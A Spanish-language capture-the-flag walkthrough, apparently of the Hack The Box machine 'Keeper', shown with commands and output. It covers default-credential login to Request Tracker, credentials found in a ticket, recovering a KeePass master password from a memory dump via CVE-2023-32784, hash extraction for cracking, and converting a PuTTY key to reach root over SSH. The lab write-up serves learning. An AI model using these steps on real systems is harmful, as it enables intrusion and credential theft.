----------------
- Tags: #Linux #keepass #dump #putty #putty2ssh
-------------------

![Pasted image 20241029170559.png](/assets/images/Pastedimage20241029170559.png)
# RECONOCIMIENTO

- Hacemos un `ping` a la maquina victima para saber contra el tipo de sistema que nos estamos enfrentando

```bash
ping -c 5 10.10.11.227
PING 10.10.11.227 (10.10.11.227) 56(84) bytes of data.
64 bytes from 10.10.11.227: icmp_seq=1 ttl=63 time=82.0 ms
64 bytes from 10.10.11.227: icmp_seq=2 ttl=63 time=42.3 ms
64 bytes from 10.10.11.227: icmp_seq=3 ttl=63 time=42.2 ms
64 bytes from 10.10.11.227: icmp_seq=4 ttl=63 time=43.0 ms
64 bytes from 10.10.11.227: icmp_seq=5 ttl=63 time=42.2 ms

--- 10.10.11.227 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4047ms
rtt min/avg/max/mdev = 42.154/50.331/82.028/15.851 ms
```

Como podemos ver nos estamos enfrentando a una maquina `Linux` por el campo de los `ttl=63`.

- Reconocimiento de puertos abierto de la maquina

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.227 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-29 12:59 UTC
Initiating SYN Stealth Scan at 12:59
Scanning 10.10.11.227 [65535 ports]
Discovered open port 80/tcp on 10.10.11.227
Discovered open port 22/tcp on 10.10.11.227
Completed SYN Stealth Scan at 12:59, 11.97s elapsed (65535 total ports)
Nmap scan report for 10.10.11.227
Host is up, received user-set (0.086s latency).
Scanned at 2024-10-29 12:59:35 UTC for 12s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.09 seconds
           Raw packets sent: 65639 (2.888MB) | Rcvd: 65639 (2.626MB)
```

- Escaneo exhaustivo sobre los puertos abiertos para el reconocimiento de servicios

```bash
nmap -p22,80 -sCV 10.10.11.227 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-29 13:02 UTC
Nmap scan report for keeper.htb (10.10.11.227)
Host is up (0.057s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.47 seconds
```

Como podemos ver tenemos tanto el puerto 22 abierto corriendo el servicio de `ssh` por detrás y el puerto 80 abierto con un servicio `http`.

-----------------------------

# RECONOCIMIENTO WEB

- Antes de empezar a `Fuzzear` haría algunos escaneos básicos de reconocimiento sobre la web que nos pueden dar algún tipo de información valiosa en algunos casos

```bash
whatweb http://10.10.11.227:80
http://10.10.11.227:80 [200 OK] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.227], nginx[1.18.0]
```

No nos devuelve nada interesante, podríamos lanzar un script de `nmap` para ver directorios abiertos que puede tener la pagina pero ya adelanto que no hay nada.
Por lo que vamos a echar un vistazo a la web a ver que nos proporciona.

![Pasted image 20241029140721.png](/assets/images/Pastedimage20241029140721.png)

Como podemos ver nos esta dando información sobre el dominio, por lo que vamos a agregar en nuestro `/etc/hosts` `keeper.htb` & `tickets.keeper.htb`.

- Visitamos la web con los nombres actualizados

![Pasted image 20241029141059.png](/assets/images/Pastedimage20241029141059.png)

Nos encontramos contra un panel de `Login` de una especie de repositorio llamado `REQUEST TRACKER`, por lo que vamos a ver las contraseñas por defecto que puede tener.

`Log in. Use a browser to log into RT. **Username is root , and password is password.`

![[Pasted image 20241029141627.png]]

Y conseguimos acceder al panel de Administración de la web, indagando un poco encontramos lo siguiente.

![Pasted image 20241029141744.png](/assets/images/Pastedimage20241029141744.png)

Un tal nombre de usuario `lnorgaard` y una password `Welcome2023!` por lo que como sabemos que tenemos el `ssh` abierto vamos a probar estas credenciales a ver si podemos tener acceso a la maquina.

-------------------------

# USER AS lnorgaard

- Inicio de sesión a través de `ssh`

```bash
ssh lnorgaard@keeper.htb
lnorgaard@keeper.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have mail.
Last login: Tue Oct 29 12:11:53 2024 from 10.10.16.2
lnorgaard@keeper:~$ cat user.txt 
c409569599b****************
```

----------------------------

# TRATAMIENTO DE LA TTY EN UNA SHELL DE SSH

```bash
lnorgaard@keeper:~$ export TERM=xterm
lnorgaard@keeper:~$
```

-----------------------------

# ESCALADA DE PRIVILEGIOS A ROOT

```bash
lnorgaard@keeper:~$ ls -la
total 85384
drwxr-xr-x 4 lnorgaard lnorgaard     4096 Jul 25  2023 .
drwxr-xr-x 3 root      root          4096 May 24  2023 ..
lrwxrwxrwx 1 root      root             9 May 24  2023 .bash_history -> /dev/null
-rw-r--r-- 1 lnorgaard lnorgaard      220 May 23  2023 .bash_logout
-rw-r--r-- 1 lnorgaard lnorgaard     3771 May 23  2023 .bashrc
drwx------ 2 lnorgaard lnorgaard     4096 May 24  2023 .cache
-rw------- 1 lnorgaard lnorgaard      807 May 23  2023 .profile
-rw-r--r-- 1 root      root      87391651 Oct 29 14:24 RT30000.zip
drwx------ 2 lnorgaard lnorgaard     4096 Jul 24  2023 .ssh
-rw-r----- 1 root      lnorgaard       33 Oct 29 11:53 user.txt
-rw-r--r-- 1 root      root            39 Jul 20  2023 .vimrc
lnorgaard@keeper:~$
```

- Tenemos un archivo `.zip` que parece bastante interesante, por lo que vamos a transferirlo a nuestra maquina atacante y analizamos el fichero con detalle

```bash
lnorgaard@keeper:~$ md5sum RT30000.zip 
c29f90dbb88d42ad2d38db2cb81eed21  RT30000.zip
lnorgaard@keeper:~$
lnorgaard@keeper:~$ which python3
/usr/bin/python3
lnorgaard@keeper:~$ python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
```

```bash
wget http://10.10.11.227:8081/RT30000.zip
--2024-10-29 13:26:53--  http://10.10.11.227:8081/RT30000.zip
Conectando con 10.10.11.227:8081... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 87391651 (83M) [application/zip]
Grabando a: «RT30000.zip»

RT30000.zip                                   100%[================================================================================================>]  83,34M  13,9MB/s    en 8,8s    

2024-10-29 13:27:02 (9,52 MB/s) - «RT30000.zip» guardado [87391651/87391651]

md5sum RT30000.zip
c29f90dbb88d42ad2d38db2cb81eed21  RT30000.zip
```

- Una vez transferido vamos a descomprimirlo a ver que contiene

```bash
unzip RT30000.zip
Archive:  RT30000.zip
  inflating: KeePassDumpFull.dmp     
 extracting: passcodes.kdbx          
❯ ls -la
drwxr-xr-x root root  88 B  Tue Oct 29 13:29:17 2024  .
drwxr-xr-x root root  52 B  Tue Oct 29 13:26:26 2024  ..
.rwxr-x--- root root 242 MB Wed May 24 10:51:31 2023  KeePassDumpFull.dmp
.rwxr-x--- root root 3.5 KB Wed May 24 10:51:11 2023  passcodes.kdbx
.rw-r--r-- root root  83 MB Tue Oct 29 13:26:01 2024  RT30000.zip
```

- Como podemos ver el archivo contiene una base de datos `.kdbx` lo que significa que es un archivo de `keepass` que esta protegido por una `password`, lo primero que se me ocurre viendo esto es extraer el `hash` de dicho fichero e intentar crackearlo con el uso de la herramienta `John`, os voy adelantando que no va a funcionar debido a que la contraseña no esta dentro del diccionario, pero se haría de la siguiente forma por si os interesa saberlo.

```bash
❯ keepass2john passcodes.kdbx > hash
❯ cat hash
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: hash
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ passcodes:$keepass$*2*60000*0*5d7b4747e5a278d572fb0a66fe187ae5d74a0e2f56a2aaaf4c4f2b8ca342597d*5b7ec1cf6889266a388abe398d7990a294bf2a581156f7a7452b4074479bdea7*08500fa5a52622
       │ ab89b0addfedd5a05c*411593ef0846fc1bb3db4f9bab515b42e58ade0c25096d15f090b0fe10161125*a4842b416f14723513c5fb704a2f49024a70818e786f07e68e82a6d3d7cdbcdc
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Con el `hash` extraído lo único que tendríamos que hacer es crackearlo con la herramienta de la siguiente forma

```bash
john --w=/usr/share/wordlists/rockyou.txt hash
```

- Como he mencionado anteriormente, no iba a funcionar de esa manera pero ahí la tenéis como manera de aprendizaje, como podemos ver, no solo tenemos el fichero `.kdbx` sino que también hay un `.dmp` que viene siendo un `dumpeo` de la memoria, si investigamos un poco podemos ver que `Keepass` tenia una vulnerabilidad que a través de un `dumpeo` de la memoria podíamos obtener el valor de la clave maestra es texto claro, por lo que indagando un poco he encontrado la siguiente vulnerabilidad `CVE-2023-32784`. Hay mucho exploits para esta vulnerabilidad desarrollados en infinidad de lenguajes pero yo he elegido el siguiente [exploit](https://github.com/dawnl3ss/CVE-2023-32784).

```bash
python3 poc.py KeePassDumpFull.dmp
2024-10-29 13:40:47,756 [.] [main] Opened KeePassDumpFull.dmp
Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●`dgr●d med fl●de
Possible password: ●-dgr●d med fl●de
Possible password: ●'dgr●d med fl●de
Possible password: ●]dgr●d med fl●de
Possible password: ●Adgr●d med fl●de
Possible password: ●Idgr●d med fl●de
Possible password: ●:dgr●d med fl●de
Possible password: ●=dgr●d med fl●de
Possible password: ●_dgr●d med fl●de
Possible password: ●cdgr●d med fl●de
Possible password: ●Mdgr●d med fl●de
```

Nos devuelve las posibles credenciales que pueden ser, si buscamos eso en google nos sale lo siguiente

`Rødgrød med Fløde`

- Probamos la password tanto en minúsculas como mayúsculas para ver si puede funcionar

![Pasted image 20241029144349.png](/assets/images/Pastedimage20241029144349.png)

Y ganamos acceso al gestor

![Pasted image 20241029144417.png](/assets/images/Pastedimage20241029144417.png)

- Podemos ver la password, pero al testearla nos damos cuenta de que no nos sirve para ganar acceso total al equipo, por lo que indagando un poco vemos que en las notas nos encontramos un clave privada de `Putty`, si investigamos un poco hay una forma para pasar las claves privadas de `Putty` a claves privadas de `ssh`, por lo que vamos a intentar convertirla y ganar acceso completo al equipo victima.

```bash
sudo apt-get install putty-tools
puttygen id_dsa.ppk -O private-openssh -o id_rsa
puttygen id_dsa.ppk -O public-openssh -o id_rsa.pub
chmod 600 id_rsa
```

- Intentamos entrar con ssh con la clave generada

```bash
ssh root@keeper.htb -i id_rsa
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Tue Oct 29 12:44:52 2024 from 10.10.16.2
root@keeper:~# ls -la
total 85384
drwx------  5 root root     4096 Oct 29 11:53 .
drwxr-xr-x 18 root root     4096 Jul 27  2023 ..
lrwxrwxrwx  1 root root        9 May 24  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root     3106 Dec  5  2019 .bashrc
drwx------  2 root root     4096 May 24  2023 .cache
-rw-------  1 root root       20 Jul 27  2023 .lesshst
lrwxrwxrwx  1 root root        9 May 24  2023 .mysql_history -> /dev/null
-rw-r--r--  1 root root      161 Dec  5  2019 .profile
-rw-r-----  1 root root       33 Oct 29 11:53 root.txt
-rw-r--r--  1 root root 87391651 Jul 25  2023 RT30000.zip
drwxr-xr-x  2 root root     4096 Jul 25  2023 SQL
drwxr-xr-x  2 root root     4096 May 24  2023 .ssh
-rw-r--r--  1 root root       39 Jul 20  2023 .vimrc
root@keeper:~# cat root.txt 
fc24007e975259a610b2fe01e7fb6a30
root@keeper:~#
```

Como podemos ver ganamos el control total de la maquina y ya hemos completado este reto.
